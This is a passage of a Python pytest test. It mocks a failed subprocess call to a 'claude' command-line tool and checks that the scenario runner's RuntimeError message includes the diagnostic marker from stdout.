        fake_result = subprocess.CompletedProcess(
            args=["claude"],
            returncode=2,
            stdout=f"some context {diagnostic_marker} more text",
            stderr="generic error",
        )

        with patch("scripts.runner.subprocess.run", return_value=fake_result):
            with pytest.raises(RuntimeError) as excinfo:
                run_scenario(scenario, model="haiku")

        # Stdout marker MUST appear in the error message
        assert diagnostic_marker in str(excinfo.value)
